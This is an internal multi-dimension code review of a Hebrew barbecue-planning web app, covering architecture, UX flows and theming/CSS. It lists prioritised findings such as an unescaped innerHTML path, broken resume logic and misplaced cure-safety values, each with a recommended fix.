# מתכונת אש — Deep Analysis v149 (Full Detail)

**Date:** 2026-07-13 · **Branch:** `improvements` (off `main`@v149) · **Method:** 10 parallel read-only specialist analysts over `build.py` + data modules. This is the **full-detail** edition — every finding (P0–P3) across all ten dimensions is written out with Evidence (`file:line`), Why it matters, Recommendation, and Effort (S/M/L). Line refs are in `build.py` unless noted. Flagship items were re-verified against live code.

> **Structure:** **§0** is the executive layer — the do-first P0 shortlist and the six cross-cutting themes (one fix pays off in several dimensions). **§1–§8** are the eight technical dimensions in full. **§9–§10** are the two new strategic tracks you asked for (multilingual, monetization). **§11** is the standalone-vs-`matkonet`-module architecture note. **§12** is the suggested execution roadmap.

Priority tiers: **P0** critical/broken · **P1** high-value · **P2** medium · **P3** nice-to-have.

---

## §0 · Executive summary

### 0.1 Do-First — the 6 P0s

| # | Finding | Dimension | Effort |
|---|---------|-----------|--------|
| **1** | Cure safety warning silently suppressed on 47 cured sausages (`calc.cure=2.5`) | Content/Safety | **S** |
| **2** | AI output → `innerHTML` with no `esc()` → localStorage/API-key exfiltration | AI/Security | **M** |
| **3** | Catalog is a dead-end — you cannot add a browsed item to a menu/cook | UX | **S** |
| **4** | "Continue where you left off" is broken (validates `mk-menu` not `mk-cook`; routes to list) | UX | **S** |
| **5** | The entire interactive UI is keyboard-inoperable | Accessibility | **L** |
| **6** | Wrong nitrite (Cure #1 vs #2) + sub-safe salt on long-dried sausages | Content/Safety | **S** |

### 0.2 Cross-cutting themes (fix once, win several places)

- **T1 · Safety numbers baked into prose.** Flagged independently by **content**, **i18n**, and **AI/security**: cure %, salt, and internal temps live inside free-text phase strings (`sausages_new.py:11,16`; `"חלוט 75-80° (לא רתיחה!)"`) and inside AI-narrated recipe/diagnosis prose. Today it's a data-integrity + AI-hallucination risk; the moment translation ships it becomes a *botulism* risk (a mis-translated "לא רתיחה"/"do not boil"). **Shared fix:** extract every safety number into structured fields rendered through the `calcBox` path (numbers from data, labels around them) so they bypass display bugs, AI narration, *and* translation; tag residual safety prose `noMT`; add a numeric-unit detector over AI/MT prose. → Content #1, i18n P0-#1, AI #4, AI #1.
- **T2 · Extract CSS/JS out of the Python string.** The architecture keystone (arch #1): lines 114–7483 are one raw `r"""…"""` with a single `__DATA__` placeholder — zero interpolation, so the CSS/JS are opaque static text with no linter/formatter/highlighting. Move them to real `app.css`/`app.js` concatenated at build (byte-identical output). **Near-zero risk, unlocks everything:** tooling that would have caught the missing `esc()`, the i18n `t()` seam, a clean `matkonet` module boundary, unit tests, and de-god-functioning. → arch #1/#4/#5/#12, UI #10, AI #1.
- **T3 · `store`/`DATA` parsing & error handling.** PWA, performance, and architecture converge on the state layer: `const DATA = __DATA__` (`build.py:1499`) is a **JS object literal**, not `JSON.parse('…')` (≈1.5–2× slower cold parse on 888 KB; one-line build fix); the whole blob is parsed at startup though `src` citations (251 KB) and seasonings (200 KB) are on-demand; `store.set` **swallows quota errors** (silent data loss); `menuState()` re-parses on 41 call sites. **Shared fix:** `JSON.parse` the blob, lazy-load the sub-blobs, surface quota failures, memoize/cache the menu + `kosherStatus`. → perf #2/#3/#4/#6/#7/#9/#10, PWA #4, arch #3/#8.
- **T4 · No service worker.** PWA, performance, and architecture all note the app claims "PWA" but ships no SW — no offline, and the 8-font CDN load blocks first paint and fails offline. **Shared fix:** emit a minimal cache-first `sw.js` (shell + icons + self-hosted fonts), key the cache on the build version, add an update-refresh toast. → PWA #1/#2, perf #1/#5.
- **T5 · Theme + `--fscale` correctness.** UI + accessibility: the dark "charcoal" theme is broken (≈14 hard-coded light backgrounds + hard-coded dark text leak through), while the *default* "Warm Cream" theme fails AA contrast on primary wayfinding text; `--fscale` is defeated by 52 inline `font-size:Npx`. **Shared fix:** tokenize the literals, add semantic tint tokens per theme, route inline font-size through a `fs(px)` helper, reassign small-text roles to passing tokens. → UI #1/#2/#3/#4, a11y #2.
- **T6 · Data-pipeline drift (safety-adjacent).** `gen_sources.py` auto-applies MAKE `calc` overrides but only **reports** researched CUT/SPEC value corrections (`svt/smt/tgt/wood`) as "pending" — they never reach `data.py`, so shipped temperatures can silently contradict their own cited source with no build failure. **Shared fix:** make CUT/SPEC corrections apply (or fail the build) exactly like MAKE `calc`. → arch #2, content T6.

---

## §1 · Architecture & maintainability

*Scope: `build.py` is 7,508 lines — lines 1–113 a Python data-merge pipeline, 114–7483 a single raw `r"""…"""` string (HTML head, `<style>` ~1,178 lines, body, `<script>` ~5,983 lines with 423 named + ~805 arrow functions in one flat global scope), 7485–7508 the writer. No P0 (builds and runs); highest-leverage risks are latent, so top items are P1. #2 is closest to critical (can silently ship wrong safety values).*

### [P1] 1 — Extract CSS and JS into real `.css`/`.js` files concatenated at build
- **Evidence:** `build.py:114` `HTML = r"""` … `build.py:7483` `"""`; the only substitution is a single `__DATA__` placeholder (`build.py:1499`, `7485`). The string is **raw**, so there is *zero* Python interpolation inside the ~7,300 lines of CSS/JS.
- **Why it matters:** Because nothing is interpolated, the CSS/JS are pure static text that editors treat as an opaque Python string — no highlighting, no linter, no formatter, no ESLint/Prettier, no "go to definition." Every edit is a diff against one giant string, maximizing merge-conflict surface. Single biggest drag on maintainability.
- **Recommendation:** Move CSS→`app.css`, JS→`app.js` as real files; in build.py read and inline them into a slim shell (`open('app.css').read()`, `open('app.js').read()`, then `.replace("__DATA__", DATA_JSON)`). Output stays a byte-comparable single `index.html`, so tests/deploy are unchanged. Near-risk-free precisely because there's no interpolation to preserve.
- **Effort:** M

### [P1] 2 — Data pipeline has a split, drift-prone source of truth
- **Evidence:** `gen_sources.py:57–68` auto-applies researched MAKE `calc` (salt/cure) via the `build.calc` merge (`build.py:93–99`), but `gen_sources.py:75–81, 99–102` only **report** corrected CUT/SPEC values (`svt/smt/tgt/wood`) as "PENDING data.py edits" — not applied. Live values live in `data.py`; citations in auto-generated `sources.py`; the "true" researched values in `scratch/research/*.json` (19 files).
- **Why it matters:** For cuts/specials, `data.py` can silently drift from the research JSON that justifies it — a human must hand-copy each corrected temperature. These are cooking-safety numbers (internal targets, pasteurization). A dropped "pending edit" ships a temperature whose own cited source contradicts it, with no build-time failure.
- **Recommendation:** Make the pipeline authoritative: either (a) have `gen_sources.py` emit CUT/SPEC value overrides the build merges like MAKE `calc`, or (b) add a build-time assertion that fails when any `data.py` value diverges from a verified research JSON value. Pick one direction for all three item types.
- **Effort:** M

### [P1] 3 — No state layer — ~20 ad-hoc globals + 36 scattered storage keys + manual re-render
- **Evidence:** Module-level globals: `cardSess` (1592), `seasFilter` (1824), `seasPkState` (1833), `curProject`/`pendingProject` (2115), `cart` (2120, vestigial), `activeCats` (2262), `activeMakeCat` (2263), `filters` (2264), `activeGroup` (2381), `glossFilter` (3166), `favs` (3245), `cwActiveCat`/`cwQuery`/`cwCont` (5796), `pwState` (7235), plus `window._tlSeasOpen`, `window._wpTasks`, `window._wipeTmo`. Persistence is a 4-line `store` wrapper (`build.py:2110`) over **36 distinct `mk-*` key literals** with no central registry. `render()` (2305) rebuilds grids via full `innerHTML=` (73 such assignments); **287 `addEventListener` calls** must be re-wired after every rebuild.
- **Why it matters:** No single place describes app state or the persistence schema. A mistyped `mk-` key fails silently (`store.get`→`null`). Every feature must manually rebuild HTML *and* re-attach listeners; forgetting either is a recurring bug class. Globals + re-wiring sites grow super-linearly with features.
- **Recommendation:** Thin state module: (a) a `KEYS` constant object enumerating all `mk-*` keys (kills the typo class, documents the schema, centralizes migrations); (b) a small `mount(host, html, wire)` helper pairing innerHTML with its wiring; optionally (c) root event delegation instead of per-node listeners.
- **Effort:** L

### [P1] 4 — God functions mixing markup, business logic, and event wiring
- **Evidence:** Largest functions (line span): `renderTimelinePanel` 303 (`5177`), `openCut` 145 (2659), `openKeyManager` 132 (4482), `cPaintProjects` 131 (6847), `openAbout` 114 (3987), `renderMenu` 98 (4716), `openWoods` 88 (3899), `openJournal` 77 (3774), `askFire` 74 (4186). `renderTimelinePanel` alone sets innerHTML, defines nested `buildList`, wires notification permissions, timers, and reset-with-undo.
- **Why it matters:** Interleaving HTML strings, control flow, `store` I/O, and listener wiring in one scope makes them untestable, hard to read, and prime merge-conflict zones.
- **Recommendation:** Split each into a pure `…Html()` view builder (returns string, testable) + a `wire…(host)` function. Extract nested closures like `buildList` to named siblings. Do opportunistically, starting with `renderTimelinePanel` and `openCut`.
- **Effort:** L (incremental)

### [P2] 5 — One flat file/namespace holds clearly separable modules
- **Evidence:** Function-name prefixes reveal latent modules sharing one global scope: `open*` 43, `cw*` (wizard) 22, `vc*` (voice) 17, `ai*` 13, `gear*` 9, plus timeline/seasonings/kashrut. No `import`/`export` anywhere.
- **Why it matters:** Any function can call any other; boundaries exist only by naming convention; blocks unit testing and isolated reasoning.
- **Recommendation:** After #1, split `app.js` into per-domain files (`catalog.js`, `wizard.js`, `voice.js`, `ai.js`, `timeline.js`, `seasonings.js`, `state.js`) concatenated in build.py; ES modules become feasible later.
- **Effort:** M

### [P2] 6 — No HTML-escaping helper — all user text interpolated raw into innerHTML
- **Evidence:** Only sanitizer is `stripEmoji` (`4832`); no `esc()`/`escapeHtml()` exists. User strings (project/menu names, journal `mk-journal`, burger names `mk-burger`) flow straight into template literals assigned to `innerHTML`. `appDialog` (3014) escapes only `"` in its input value and injects `o.msg` unescaped (3020).
- **Why it matters:** A name with `&`, `<`, or `"` renders wrong or breaks the panel; a latent (self-inflicted, local-first) XSS surface that expands with every new text input. (This is the architecture-side view of the AI/security P0 — see §4 #1.)
- **Recommendation:** Add one `esc(s)` helper and apply it at every interpolation of user-sourced text.
- **Effort:** S (helper) / M (apply everywhere)

### [P2] 7 — Repeated card/panel scaffolding
- **Evidence:** `cutCard`/`specCard`/`makeCard` (`2205/2234/2248`) share near-identical structure; `openCut`/`openSpec`/`openMake` (2659/2913/2965) repeat the `panel-top`/`statline`/`panel-body` scaffold with per-type stat rows.
- **Why it matters:** Any card/panel chrome change must be made in three synced places.
- **Recommendation:** Extract `card(meta, extraMeta)` and `panelShell(meta, bodyHtml)` taking the shared scaffold + a per-type slot; the `metaCut/metaSpec/metaMake` normalizers (2346–2348) already give a common shape.
- **Effort:** M

### [P2] 8 — Swallow-all error handling hides failures
- **Evidence:** 55 `try` / 57 `catch`, dominated by empty `catch(e){}`: the `store` wrapper (2111–2112) silently returns `null`/no-ops on quota/parse errors; `closePanel` (3042) swallows `speechSynthesis.cancel()`; `projById` (2116) returns `null` on any error. Good counter-example at 3761 (journal photo quota → toast).
- **Why it matters:** Storage-full and JSON-corruption failures vanish silently — data doesn't persist and nothing signals why. Hard to diagnose in the field on a local-first app.
- **Recommendation:** Route `store.set` failures through the existing `toast()` (as journal does); distinguish quota-exceeded from other errors; at minimum log instead of empty catches.
- **Effort:** M

### [P3] 9 — Test-only mocks compiled into the shipped bundle
- **Evidence:** `window.__vcTransMock`, `__vcAskMock`, `__aiMock` referenced in production paths (3+3+3 sites) to let Playwright stub AI/voice.
- **Why it matters:** Test scaffolding ships to every user; production branches on test-only globals; couples AI/voice code to the harness.
- **Recommendation:** Gate behind a build flag / single `__TEST__` guard stripped at build, or inject via the test page.
- **Effort:** S

### [P3] 10 — Accumulated dead code never removed
- **Evidence:** `foldCorner()` returns `''` but still called in all three card builders (2147, 2207, 2235, 2250); `if(false){…}` vintage/gold blocks in `svgThumb` (2180–2193); `cwPaintMethods`/`cwPaintProteins`/`cwUpdateHint` legacy no-ops (6052–6054); `saveCart(){/* retired */}` (2121) + vestigial `cart` Set (2120); hidden `#legacyTools` + empty `#legacyToolsTpl` (1461–1463); dead `classList.remove('light','t-vintage','t-gold')` (5641).
- **Why it matters:** Retired-but-invoked helpers obscure intent and carry a comment-tax.
- **Recommendation:** Delete them and their call sites in one sweep.
- **Effort:** S

### [P3] 11 — Business/data logic embedded in the build script
- **Evidence:** `build.py:40–101` mutate MAKES/SPECIALS at build time via regex "fresh-sausage cook/storage standardization" (`_has_internal_temp`, `_BLOOD`, `_THIN`, appending Hebrew store/temp text into phases).
- **Why it matters:** Content transformation lives in build glue, not the data layer — shipped recipe text can't be reviewed by reading `data.py` alone.
- **Recommendation:** Move normalization into `data.py` (or a `normalize.py`); leave build.py to assemble/serialize only.
- **Effort:** S–M

### [P3] 12 — Single-file design blocks unit testing; only e2e exists
- **Evidence:** `tests/` = 6 Playwright specs (~20 tests) against the built `index.html`. No unit tests possible — no exports; pure functions (`upperHours`, `composedSteps`, `kosherStatus`, `svSmokeOrderDefault`) reachable only through the DOM.
- **Why it matters:** Fast feedback on pure logic (temp math, order-effect, kashrut) requires a browser.
- **Recommendation:** After #1/#5, export pure helpers and add a Node unit-test layer; keep Playwright for integration.
- **Effort:** M

### [P3] 13 — `_app_check.js` is an orphaned 1.37 MB artifact
- **Evidence:** `_app_check.js` (1,378,016 B) is a full `const DATA={…}`+JS dump, `.gitignore`d, but nothing generates or references it.
- **Why it matters:** An untracked megabyte-scale mirror will go stale and confuse anyone who opens it expecting source.
- **Recommendation:** Either script its generation as an explicit `build.py --check` step, or delete it and syntax-check the extracted `app.js`.
- **Effort:** S

**Architecture Top 3:** ① Extract CSS+JS (#1) — the keystone. ② Fix the data-pipeline source-of-truth split (#2) — the one with a safety consequence. ③ Minimal state module: `KEYS` registry + mount/wire helper (#3).

---

## §2 · UX, user flows & information architecture

### [P0] 1 — The catalog is a dead-end island; empty states point to a "＋" button that doesn't exist
- **Evidence:** Card click handler (`3190–3198`) only opens `openCut/openSpec/openMake`; cards render only `favStar`+`foldCorner()` (returns `''`, `2147, 2206–2260`). Item panel `fillExtras` (`3547–3561`) has favorite/rate/recipe-shop/log/butcher/woods/reset — **no "add to menu/event"**. `toggleCart()` is defined (`2124`) but **never called** anywhere. Yet three empty states tell users to use "the ＋ button on the cards": cart empty (`3121`), `presetFromCart` toast (`4672`), timeline empty (`5186`).
- **Why it matters:** The 279-item catalog — the app's core asset — is disconnected from the cook/event engine. The only way to assemble a menu is inside the wizard step-1 picker or the separate builder. A user who finds a brisket and wants to cook it has no button, and the app's own copy points to a control that isn't there. Single biggest IA break.
- **Recommendation:** Add a persistent "➕ הוסף לתפריט/לבישול" button to the item panel (`fillExtras`) and a small ＋ on each card, both wired to the existing `toggleCart(key)`. Fix the three empty-state strings. Closes the browse→cook loop with minimal code.
- **Effort:** S

### [P0] 2 — "Continue where you left off" is broken for Cook, and mis-routes for Events
- **Evidence:** `cwPaintReview` writes `mk-cresume` in both contexts (`6014`). But `cRefreshHome` validates only against the **event** store: `store.get('mk-menu')` → `hasDraft=(evMenu.keys||[]).length>0` (`6058–6061`). In cook context the menu lives in `mk-cook` (`menuKey()`, `4651`), so `mk-menu` is empty and the resume card is hidden — a cook draft never resumes. Separately the resume click goes to the events *list*: `cResume … cNavGo('events')` (`7454`), not back into the wizard where the user stopped.
- **Why it matters:** Home promises "המשך מהמקום שעצרת." For the cook path it silently never appears; for events it drops you on a list, not your in-progress plan. Broken resume undermines a local-first app whose value is "pick up later."
- **Recommendation:** Store the resume context with the record (`{ctx, …}`); validate `hasDraft` against `menuState()` for the saved context. On click, restore that context and `cwGo(cWiz.step)` / open the timeline, not the list.
- **Effort:** S

### [P1] 3 — Two near-identically-named menu builders write the same state but expose different features
- **Evidence:** The 6-step wizard (`cwGo`, `5767`) and `openMenu`/`renderMenu` ("בונה תפריט לאירוח", `4686, 4716`) both mutate `mk-menu`. Only the wizard has method toggles (step 2) + seasonings (step 3); only the builder has per-guest grams, presets, swap (`↻`), quantity math (`4746–4774`). The wizard review even links "🍽️ פתח בונה ארוחה" (`1411`); the More sheet lists "בונה ארוחה" separately (`7424`).
- **Why it matters:** Users can't tell which surface to use; quantities invisible in the wizard, methods/seasonings invisible in the builder, edits in one silently reshape the other. Three names for one job.
- **Recommendation:** Pick one canonical builder. Fold quantities/presets/swap into the wizard (or make the builder a read/edit summary of wizard state) and drop duplicate entry points. If both must stay, make them tabs of one surface.
- **Effort:** L

### [P1] 4 — Event vs Cook is one wizard with a hidden context system whose switches surprise users
- **Evidence:** `cStartCook` vs `cStartNewEvent` differ only by `setMenuCtx('cook'|'event')` (`7441–7442`); the cook home copy says "אותו אשף מודרך כמו אירוע" (`1337`). Cook mode only skips step 4 and hides save/event fields. Context is silently flipped by *navigation*: entering Events calls `setMenuCtx('event')` (`cPaintEvents`, `6142`), and `menuKey()` repoints timeline/cart/voice to `mk-menu`.
- **Why it matters:** A user mid-cook who taps Events has their context switched to `event`; opening the timeline then shows the event menu, not their cook. Two buckets + implicit switching is heavy machinery for what looks like one flow with one skipped step.
- **Recommendation:** Either merge cook into event (one flow; "no guests/sides" is an option), or make context an explicit visible toggle in the wizard header and stop flipping it as a navigation side effect.
- **Effort:** M

### [P1] 5 — Onboarding is one cold modal asking experience level before the user has seen anything
- **Evidence:** Only first-run guidance is `maybeAskUiLevel`, fired 400 ms after load asking מתחיל/בינוני/מתקדם (`5687–5699, 7480`). The "how to use" (`openGuide`) is buried behind a home button `#cHomeAbout` (`1342, 7447`) and the More sheet (`7427`). No tour of the three paths, catalog, or timeline.
- **Why it matters:** Asking experience with no context yields low-quality answers and teaches nothing about what the app does. New users land on a home screen with 3 competing paths, an AI card, two resume cards, and a search box, unoriented.
- **Recommendation:** Replace the cold prompt with a 2–3 card first-run overlay naming the three paths + the catalog, inferring level from a concrete choice (or default mid, surface level in settings). Keep the level question optional/contextual (e.g. first timeline open).
- **Effort:** M

### [P1] 6 — Wizard review buries the primary action under five stacked CTAs
- **Evidence:** Step 5 renders, in order: `💾 שמור אירוע`, `📋 צור תוכנית עבודה מלאה`, `🍽️ פתח בונה ארוחה`, `🎙️ מצב בישול קולי`, `סיום · לרשימת האירועים` (`1409–1413`) — all full-width, last three `ghost` but prominent.
- **Why it matters:** After building a menu the goal is "get my plan." Five equally-weighted buttons (+ save-vs-plan ambiguity) create decision paralysis at the payoff moment.
- **Recommendation:** One primary CTA ("📋 צור תוכנית עבודה"), auto-save silently, demote voice/builder/finish to a small secondary row or overflow.
- **Effort:** S

### [P1] 7 — The 3 work-plan "shapes" use abstract names and pile controls above the plan
- **Evidence:** `SHAPE_NAMES={'5':'צירים מתקפלים','1':'קו-זמן אנכי','3':'צעדים אופקי'}` (`5661`), driven by `uiLevel` via `LEVEL_SHAPE` (`5660`). `workPlanHtml` stacks an order strip with repeated safety warnings, a detail toggle + voice launch, a shape-picker row, *then* the plan (`5336–5348`), plus the outer item/plan toggle (`5245`).
- **Why it matters:** A cook at the smoker faces four rows of toggles before the first task. "צירים מתקפלים" vs "צעדים אופקי" is meaningless without trying each; three layouts for the same data add clutter for low value.
- **Recommendation:** Collapse to one strong vertical timeline as default; move layout/detail into a single "⋯ תצוגה" menu; rename/drop the shape abstraction (or show tiny thumbnails).
- **Effort:** M

### [P1] 8 — Timeline item cards are a dense control cluster; the smoke-first warning is verbose and duplicated
- **Evidence:** Each `itemRowHtml` packs stage buttons (מוכן/הוכן מראש/מאפס), method `<select>`, order `<select>`, seasoning toggle, burger button, expandable stages, doneness reference (`5407–5431`). The smoke-first warning appears both per-item (`5398`) and again per-item in the plan-view order strip (`5344`).
- **Why it matters:** This is the "phone by the smoker" surface — one-handed, glanceable. Instead each item is a mini control panel and the key safety note is a wall of text repeated in two views.
- **Recommendation:** Default cards to a compact one-line row (time · name · state chip), controls behind a single "⚙ שנה." Reduce the safety warning to one concise line with a "why" disclosure, once per item.
- **Effort:** M

### [P2] 9 — `uiLevel` and `menuCtx` are two orthogonal hidden "mode" systems with thin payoff
- **Evidence:** `uiLevel` (`5662`) mainly selects a default plan shape (`LEVEL_SHAPE`), exposed via `openUiLevel` (`5668`) + the cold prompt; `menuCtx` (`4649`) toggles storage. Both invisible-until-they-bite.
- **Why it matters:** Two hidden global modes multiply app states and make behavior unpredictable ("why is my menu empty / plan different") for benefits users don't perceive.
- **Recommendation:** Keep level as a pure appearance preference co-located in Appearance (`5668` vs `5700`); don't gate onboarding on it. Reconsider whether `menuCtx` needs to exist (see #4).
- **Effort:** M

### [P2] 10 — The "More" (☰) sheet crams ~20 tools and overlaps the bottom nav and home paths
- **Evidence:** `openMoreSheet` lists ~20 items in 4 groups (`7422–7428`), reachable from home/catalog/events/projects headers. Several duplicate the bottom nav (projects/events) and home ("שאל את האש", builder); timeline/cart/menu appear here *and* in the wizard/events cards.
- **Why it matters:** No single mental model for "where is X." The same tool is reachable 3–4 ways with different labels ("מתזמן" vs "צור תוכנית עבודה" vs "📋 תוכנית עבודה").
- **Recommendation:** Group More strictly by nouns the user has (My event / My projects / Reference / Settings); remove items already one tap away in the bottom nav; standardize the timeline label across entry points.
- **Effort:** M

### [P2] 11 — Nested scroll trap + stacked chrome in the wizard picker (mobile)
- **Evidence:** The pick list is `max-height:48vh; overflow-y:auto` inside the scrolling wizard page (`1375`), beneath category chips, continent chips, a count row, and a sticky "already chosen" bar (`1371–1374`, populated `5810–5850`).
- **Why it matters:** Inner scroll regions inside a scrolling page are a known one-handed-mobile frustration (scroll capture, tiny 48vh window); four stacked bars leave little room for the list.
- **Recommendation:** Let the list flow in the page (no inner scroll); make the chosen-summary a collapsible one-liner; keep only category chips sticky.
- **Effort:** S

### [P2] 12 — Fragmented search — a fake readonly home box plus four separate real search inputs
- **Evidence:** Home search is `readonly` and just navigates: `#cHomeSearch … cNavGo('catalog')` (`1331, 7445`), yet placeholder is "חפש הכל — נתח, נקניקייה, מתבל…". Separate real inputs: catalog (`#q`), wizard (`#cwSearch`), help (`#tSearch`), seasonings — each with its own scope.
- **Why it matters:** Typing into the home box does nothing (readonly) → reads as broken; "search" means something different on every screen.
- **Recommendation:** Make the home box a real global search that opens catalog with the query pre-applied (or change its affordance to a button). Longer term, one search component reused across surfaces.
- **Effort:** S

### [P2] 13 — Method step reads like an error for "ready" products; AI loading states are inconsistent
- **Evidence:** Wizard step 2 renders specials/ready products as a bare grey "מוצר מוכן — ללא שיטת בישול" (`cwPaintMethodsFull`, `5875`). AI flows have some feedback ("רגע, בודק"/"…חושב", `5113–5114`) but other AI entry points (event planner, recipe gen, journal insights, diagnose) each roll their own; no shared pending pattern.
- **Why it matters:** "No cooking method" phrased as a dead statement reads as failure to a beginner; inconsistent AI waiting states feel flaky.
- **Recommendation:** Reword positively ("✔ מוצר מוכן — עובר ישר לתיבול/הגשה"). Introduce one shared loading/error-retry pattern for all `aiJSON`-based calls.
- **Effort:** S

### [P3] 14 — Wizard navigation is strictly linear — the progress bar isn't a way back
- **Evidence:** `cwProg` renders non-interactive segments (`5760–5766`); movement only via Continue (`data-cwgo`) and `#cwBack` (one step at a time or exit, `6030`).
- **Why it matters:** To fix guest count from step 5 you Back four times; the progress indicator looks tappable but isn't.
- **Recommendation:** Make completed progress segments clickable to jump (guard forward jumps needing selections).
- **Effort:** S

**UX Top 3:** ① Wire add-to-menu from catalog card + panel (reuse dead `toggleCart`) and fix the three phantom-＋ strings. ② Fix resume (validate active context; return to wizard/timeline not list). ③ Consolidate the duplicate builders + the event/cook context split into one clearly-named flow. *Strength to preserve: destructive actions consistently offer undo toasts (`5565, 3710, 3787`).*

---

## §3 · UI / visual design & CSS

*The token system (`:root` + 4-theme `THEMES` + `--fscale` + font-pair roles) and RTL logical properties are mostly correct, but three systemic leaks — hard-coded light colors, non-scaling inline `font-size`, hard-coded `font-family` — leave theming/dark-mode/accessibility ~70% wired. No P0 (nothing crashes); the charcoal dark theme is substantially broken in tool panels.*

### [P1] 1 — Hard-coded light backgrounds break the charcoal (dark) theme
- **Evidence:** `.gear-banner{background:#eef4f7…}` (1074) with `.gear-banner span{color:var(--bone)}` (1075); `.gear-alt{background:#f3f7f9}` (1089), `.thermo-note` (1096), `.smoker-tip{background:#fff6ec}` (1098), `.tl-safety-warn{background:#fbe9e7;color:#7a231b}` (1213), `.ask-src.ai{background:#e7ecff}` (845), `.chome-about{linear-gradient(#fff6ec,#fdeede)}` (747), `.ab-stat`/`.ab-fact` (764,783), `.shop-toggle button.on{background:#fff2e6}` (736), `.ab-step.now` (790), `.cinv-row.low` (331), `.gcap.no` (1087), `.ask-aifail` (852).
- **Why it matters:** In charcoal, `--bone` becomes `#f7ecdb` (near-white). `.gear-banner span`/`.chome-about span` render near-white text on light boxes → invisible (~1:1). Components that also hard-code text stay readable but appear as light boxes floating in a dark UI. Biggest theming-robustness hole: the token system exists yet ~14 components bypass it with literal light hex.
- **Recommendation:** Replace each literal with a token; add semantic tint tokens to every theme (`--tint-info/--tint-warn/--tint-ok/--panel-raised`) and reference them; use `linear-gradient(var(--char3),var(--char2))` for decorative light gradients.
- **Effort:** M

### [P1] 2 — Hard-coded dark text colors break dark theme (the reverse leak)
- **Evidence:** `.chome-h1{…color:#3a2418}` (172), `.brand b{color:#3a2418}` (529), `.cpath h…` region.
- **Why it matters:** `#3a2418` (dark brown) on the home hero title + brand is unreadable in charcoal (near-black bg) — the first thing a dark-theme user sees.
- **Recommendation:** Use `var(--bone)` or a dedicated `--ink-strong` per theme; remove the literal.
- **Effort:** S

### [P1] 3 — `--fscale` accessibility text-size control defeated by 52 inline `font-size:Npx`
- **Evidence:** 52 template-literal inline styles use raw px instead of `calc(…*var(--fscale))`: wizard inputs (1354–1356, 1406), source/build tables (2620, 2641, 2651, 2653–2654, 2708), AI panels (6152, 6485, 6529, 6643–6644, 6663, 6727–6733, 6772), stat overrides (2935–2937), `cscard` bodies (5875, 5907, 5913). The CSS-class rules correctly do `calc(Npx*var(--fscale))` (e.g. 582); these inline overrides don't.
- **Why it matters:** A user who selects "גדול מאוד" (`--fscale:1.3`, 5704/5633) gets scaled cards but fixed-size wizard inputs, AI output, source rows — the feature looks half-broken to exactly the low-vision users it targets.
- **Recommendation:** Move these into `--fscale` classes, or add a JS helper `fs(px)` returning `calc(${px}px*var(--fscale))` and use it in templates; delete raw inline `font-size`.
- **Effort:** M

### [P1] 4 — charcoal theme is a shipped, selectable feature yet visibly broken in tool panels
- **Evidence:** `THEMES.charcoal` (5620–5621) is one of 4 selectable themes in `openAppearance` (5702). With #1–#2, the Gear/Timeline-safety/Ask/About/Pantry panels contain unreadable/clashing light boxes.
- **Why it matters:** Not dead code — users can pick "פחם ולהבה" and land in a partly-unreadable UI.
- **Recommendation:** After tokenizing (#1), smoke-test every tool panel in charcoal; consider a Playwright visual check asserting computed contrast ≥4.5:1 per theme.
- **Effort:** M (mostly covered by #1/#2)

### [P2] 5 — ~75 lines of fully dead theme CSS
- **Evidence:** `html.light`, `html.t-vintage`, `html.t-gold` blocks (385–459); `applyAppearance` removes those classes (5641) and nothing re-adds them; `themeKey()` migrates old keys to `cream` (5635). `.fold-corner`/`::before`/`::after` (412–416) also dead (`foldCorner()`→`''`, 2147).
- **Why it matters:** Payload bloat in a 1.5 MB single-file app, and a live trap — these blocks hold plausible hard-coded colors a future editor may think active.
- **Recommendation:** Delete 385–459 (+ `.fold-corner` and the `foldCorner()` call sites in `cutCard` 2207/`specCard` 2236). ~80 lines removed.
- **Effort:** S

### [P2] 6 — Font-pair swap (`--font-body`) defeated by 15 hard-coded `font-family`
- **Evidence:** 15 inline `font-family:'Heebo'` in templates (1354–1356, 1406, 2620, 2641, 2651, 6529, 6663, 6772…), plus `.searchbar input{font-family:'Assistant'}` (491), `.acc-q` (943), `.vnum{font-family:'Frank Ruhl Libre'}` (375).
- **Why it matters:** Choosing "מגזין/גאומטרי/הומניסטי" (FONT_PAIRS, 5627) leaves the search bar, FAQ, and every wizard input stuck on the old font.
- **Recommendation:** Replace hard-coded families with `var(--font-body)`/`var(--font-display)`; keep a fallback for the search input.
- **Effort:** S

### [P2] 7 — Cream theme defined twice → drift hazard
- **Evidence:** `:root` (135–150) and `THEMES.cream.t` (5619) both define the same 14 tokens; `applyAppearance` always overwrites `:root` via `setProperty` (5643). The two lists must be kept byte-identical by hand.
- **Why it matters:** Edit one, forget the other → the JS-applied value silently wins ("I changed the CSS and nothing happened").
- **Recommendation:** Single source: keep only `cream` in CSS and emit `THEMES.cream.t` from the same Python dict, or drop `cream` from JS and let `:root` be the default.
- **Effort:** M

### [P2] 8 — No `:focus-visible`; inputs strip the focus ring
- **Evidence:** `outline:none` on `.searchbar input` (491), `.calcrow input` (551), `.exnotes/.miniform` (889), `.askrow input` (949), `.trouble-search input` (936), `.cseas-select` (243), replaced only by a border-color change (some with a soft shadow, some without, 552/891). No `:focus-visible` anywhere.
- **Why it matters:** Keyboard/switch users lose a clear focus indicator on primary inputs; border-color shift is too subtle and absent on buttons.
- **Recommendation:** One global rule: `:focus-visible{outline:2px solid var(--ember);outline-offset:2px}`; keep the box-shadow accent for inputs. Cheap, large a11y win.
- **Effort:** S

### [P2] 9 — Duplicate/overridden `.card` rule (leftover from thumb redesign)
- **Evidence:** `.card` at 577 (`padding:16px;…gap:10px`) then redefined at 682 (`padding:0;gap:0`); `.card .num` (580) unused since the switch to `.thumb`/`.tnum`.
- **Why it matters:** Reader confusion + specificity noise; the real card layout is split across two non-adjacent blocks.
- **Recommendation:** Consolidate into one `.card` rule; delete dead `padding/gap` (577–578) and unused `.card .num`.
- **Effort:** S

### [P2] 10 — Inline-style sprawl (248 occurrences) is the root architecture smell
- **Evidence:** 248 `style="…"` in template literals — the direct cause of #1/#3/#6 (theming, scaling, font leaks).
- **Why it matters:** Styling scattered across ~7,450 lines makes any cross-cutting change an error-prone find-replace.
- **Recommendation:** Rule: no color/font-family/font-size in inline styles — only layout one-offs and `--c` custom-prop passing (as `toolTop` correctly does at 5578); migrate color/size ones to classes over time.
- **Effort:** L

### [P3] 11 — `<meta name="theme-color">` is stale
- **Evidence:** `content="#16110d"` (121) — a near-black from the retired coal default; current default is `cream` (light).
- **Recommendation:** Update in `applyAppearance` per `THEME_SCHEME` (e.g. active `--char`). One line.
- **Effort:** S

### [P3] 12 — RTL: a few physical properties remain
